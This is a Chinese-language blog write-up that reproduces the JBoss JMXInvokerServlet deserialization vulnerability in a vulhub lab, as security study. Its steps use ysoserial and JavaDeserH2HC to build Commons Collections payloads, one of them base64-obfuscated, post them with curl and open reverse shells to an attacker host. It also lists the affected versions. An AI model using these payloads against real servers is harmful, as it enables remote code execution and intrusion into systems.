---
layout: post
title: JBoss JMXInvokerServlet 反序列化漏洞
tags: JBoss
categories: 反序列化漏洞
---

# JBoss JMXInvokerServlet 反序列化漏洞

## 漏洞描述

这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8080`可以看到JBoss默认页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937692018111.jpg)

1.使用[DeserializeExploit.jar](https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)

下载后使用命令`java -jar DeserializeExploit.jar`运行工具

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15938278404053.jpg)

执行命令

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15938278887396.jpg)

2.使用[ysoserial](https://github.com/frohoff/ysoserial)生成反序列化ser文件

```
git clone https://github.com/frohoff/ysoserial

cd ysoserial/

mvn clean package -DskipTests

cd target/

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" > poc.ser

curl http://127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @poc.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937707636140.jpg)

或者通过burp发送poc.ser文件

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937711004939.jpg)

同时在攻击机上开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937709352838.jpg)

3.使用[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC.git)

```
git clone https://github.com/joaomatosf/JavaDeserH2HC

cd JavaDeserH2HC/

javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 10.6.5.167:6666

curl 127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937734085990.jpg)

攻击机开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937734356996.jpg)

或者

```
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java

java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "/bin/bash -i >& /dev/tcp/攻击机IP/监听端口 0>&1"

curl 127.0.0.1:8080/invoker/JMXInvokerServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937738189923.jpg)

同时攻击机开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15937738692199.jpg)

## 受影响的版本
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0

## 参考链接

https://blog.csdn.net/JiangBuLiu/article/details/95337812

https://www.taodudu.cc/news/show-80269.html